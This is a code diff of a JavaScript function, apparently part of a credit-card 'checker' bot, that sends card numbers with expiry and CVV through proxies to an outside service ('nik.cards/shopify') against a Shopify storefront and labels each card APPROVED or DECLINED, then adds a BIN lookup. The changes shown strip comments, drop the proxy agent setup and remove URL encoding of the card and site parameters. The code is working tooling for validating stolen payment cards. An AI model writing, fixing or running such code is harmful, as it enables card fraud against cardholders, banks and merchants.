@@ -130,109 +130,79 @@ async function processCard(ccInput, rawProxy, retries = 2) {
     country: "USA 🇺🇸",
   };
 
-  // Build axios config
   let axiosConfig = {
     timeout: 20000,
     proxy: false,
     headers: {
-      "User-Agent":
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
       Accept: "application/json",
     },
   };
 
-  // Attach proxy agent if proxy exists
-  if (rawProxy) {
-    try {
-      const formatted = formatProxy(rawProxy);
-      if (formatted) {
-        const agent = new HttpsProxyAgent(formatted);
-        axiosConfig.httpAgent = agent;
-        axiosConfig.httpsAgent = agent;
-      }
-    } catch (e) {
-      console.error("Proxy agent error:", e.message);
-    }
-  }
-
   for (let i = 0; i <= retries; i++) {
     try {
-      // Get site from DB
+      // ✅ Get site from DB
       let config = await Config.findOne({ key: "main_config" });
       let siteUrl = config?.shopifySiteUrl || "https://planterhomawholesale.com/";
       if (!siteUrl.endsWith("/")) siteUrl += "/";
 
-      // Convert cc|mm|yy|cvv format to cc|mm|yy|cvv (already correct, just ensure pipe format)
-      // nik.cards API expects: cc=NUMBER|MM|YYYY|CVV
-      // Make sure year is 4-digit
+      // ✅ Format CC: ensure 4-digit year, padded month
       const ccParts = ccInput.trim().split(/[|\/\s]+/);
-      let formattedCC = ccInput.trim(); // default
+      let formattedCC = ccInput.trim();
 
       if (ccParts.length === 4) {
         let [num, mm, yy, cvv] = ccParts;
-        // Fix 2-digit year to 4-digit
         if (yy.length === 2) yy = "20" + yy;
-        // Pad month
         if (mm.length === 1) mm = "0" + mm;
         formattedCC = `${num}|${mm}|${yy}|${cvv}`;
       }
 
-      // Build proxy param (raw string, not formatted URL)
-      // nik.cards expects proxy as: user:pass@host:port or host:port
+      // ✅ Build proxy param (strip protocol)
       let proxyParam = "";
       if (rawProxy) {
-        // Strip protocol if present for the param
-        proxyParam = rawProxy.replace(/^https?:\/\//, "").replace(/^socks5?:\/\//, "");
+        proxyParam = rawProxy
+          .replace(/^https?:\/\//, "")
+          .replace(/^socks5?:\/\//, "");
       }
 
-      // Build API URL
-      let apiUrl = `https://nik.cards/shopify?site=${encodeURIComponent(siteUrl)}&cc=${encodeURIComponent(formattedCC)}`;
+      // ✅ Build URL — NO encodeURIComponent (nik.cards needs raw URL)
+      let apiUrl = `https://nik.cards/shopify?site=${siteUrl}&cc=${formattedCC}`;
       if (proxyParam) {
-        apiUrl += `&proxy=${encodeURIComponent(proxyParam)}`;
+        apiUrl += `&proxy=${proxyParam}`;
       }
 
-      console.log(`[CHECK] Calling API: ${apiUrl}`);
+      console.log(`[CHECK] URL: ${apiUrl}`);
 
       const shopifyRes = await axios.get(apiUrl, axiosConfig);
       const data = shopifyRes.data || {};
 
-      console.log(`[CHECK] API Response:`, JSON.stringify(data));
+      console.log(`[CHECK] Response:`, JSON.stringify(data));
 
-      // Parse response from nik.cards API
-      // Typical response: { Status: true/false, Response: "APPROVED" / "DECLINED - reason" }
-      // or { status: "approved"/"declined", message: "..." }
-      // Handle both formats:
-
+      // ✅ Parse response
       let isApproved = false;
       let responseMsg = "DECLINED";
 
       if (typeof data.Status !== "undefined") {
-        // Format 1: { Status: true, Response: "..." }
         isApproved = data.Status === true || data.Status === "true";
         responseMsg = data.Response || data.Message || (isApproved ? "APPROVED" : "DECLINED");
       } else if (typeof data.status !== "undefined") {
-        // Format 2: { status: "approved", message: "..." }
-        isApproved =
-          String(data.status).toLowerCase() === "approved" ||
-          String(data.status).toLowerCase() === "true";
+        isApproved = String(data.status).toLowerCase() === "approved" || String(data.status).toLowerCase() === "true";
         responseMsg = data.message || data.Response || (isApproved ? "APPROVED" : "DECLINED");
       } else if (typeof data.success !== "undefined") {
-        // Format 3: { success: true, msg: "..." }
-        isApproved = data.success === true || data.success === "true";
+        isApproved = data.success === true;
         responseMsg = data.msg || data.message || (isApproved ? "APPROVED" : "DECLINED");
       } else {
-        // Fallback: check if any key contains "approved"
         const raw = JSON.stringify(data).toLowerCase();
         isApproved = raw.includes("approved") && !raw.includes("not approved");
-        responseMsg = data.Response || data.message || data.msg || data.result || "DECLINED";
+        responseMsg = data.Response || data.message || data.msg || "DECLINED";
       }
 
       result.isApproved = isApproved;
       result.statusText = isApproved ? "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅" : "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌";
       result.responseText = escapeHTML(String(responseMsg));
 
-      // ✅ Success — break retry loop
-      break;
+      break; // ✅ Success — stop retrying
+
     } catch (error) {
       console.error(`[CHECK] Error attempt ${i + 1}:`, error.message);
       if (i === retries) {
@@ -244,12 +214,12 @@ async function processCard(ccInput, rawProxy, retries = 2) {
           "API Error";
         result.responseText = escapeHTML(String(errMsg));
       } else {
-        await sleep(2000 * (i + 1)); // Exponential backoff
+        await sleep(2000 * (i + 1));
       }
     }
   }
 
-  // BIN Lookup (separate, won't affect main result)
+  // ✅ BIN Lookup
   const bin = ccInput.replace(/[^0-9]/g, "").substring(0, 6);
   try {
     const binRes = await axios.get(`https://lookup.binlist.net/${bin}`, {
@@ -257,19 +227,11 @@ async function processCard(ccInput, rawProxy, retries = 2) {
       headers: { "Accept-Version": "3" },
     });
     if (binRes.data) {
-      result.brand = escapeHTML(
-        binRes.data.scheme?.toUpperCase() || result.brand
-      );
-      result.issuer = escapeHTML(
-        binRes.data.bank?.name?.toUpperCase() || result.issuer
-      );
-      result.country = `${escapeHTML(
-        binRes.data.country?.name?.toUpperCase() || "USA"
-      )} ${binRes.data.country?.emoji || "🇺🇸"}`;
+      result.brand = escapeHTML(binRes.data.scheme?.toUpperCase() || result.brand);
+      result.issuer = escapeHTML(binRes.data.bank?.name?.toUpperCase() || result.issuer);
+      result.country = `${escapeHTML(binRes.data.country?.name?.toUpperCase() || "USA")} ${binRes.data.country?.emoji || "🇺🇸"}`;
     }
-  } catch (e) {
-    // Silent fail — BIN lookup is optional
-  }
+  } catch (e) {}
 
   return result;
 }
